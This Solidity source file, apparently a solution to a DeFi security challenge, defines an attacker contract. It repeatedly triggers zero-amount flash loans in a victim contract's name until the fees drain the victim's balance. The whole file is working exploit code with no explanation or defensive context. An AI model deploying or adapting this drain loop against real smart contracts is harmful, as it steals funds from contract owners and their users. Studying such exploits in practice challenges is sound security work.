// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";



contract AttackerNaive {
    address payable private lender;
    constructor(address payable _lender) {
        lender = _lender;
    }

    // take a flash loan until victim balance == 0
    function attack(address payable victim) public {
        while (victim.balance > 0) {
            (bool sent, ) = lender.call(
                abi.encodeWithSignature(
                    "flashLoan(address,uint256)",
                    victim,
                    0
                )
            );
            require(sent, "call failed");
        }
    }
}